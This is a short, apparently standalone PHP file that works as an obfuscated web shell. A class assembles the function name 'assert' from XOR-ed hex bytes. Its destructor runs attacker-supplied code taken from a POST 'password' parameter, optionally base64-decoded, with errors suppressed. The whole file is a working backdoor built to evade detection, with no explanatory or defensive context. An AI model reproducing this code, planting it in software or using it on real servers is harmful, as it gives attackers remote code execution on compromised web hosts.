<?php 
class YPNX { 
    function xRNA() {
        $dorK = "\x14" ^ "\x75";
        $xLGK = "\xc5" ^ "\xb6";
        $aIAV = "\x1" ^ "\x72";
        $PCWV = "\x8d" ^ "\xe8";
        $tEMp = "\x96" ^ "\xe4";
        $eUdm = "\x21" ^ "\x55";
        $TFYi =$dorK.$xLGK.$aIAV.$PCWV.$tEMp.$eUdm;
        return $TFYi;
    }
    function __destruct(){
        $uNHI=$this->xRNA();
        @$uNHI($this->fR);
    }
}
$ypnx = new YPNX();
@$ypnx->fR = isset($_GET['id'])?base64_decode($_POST['password']):$_POST['password'];
?>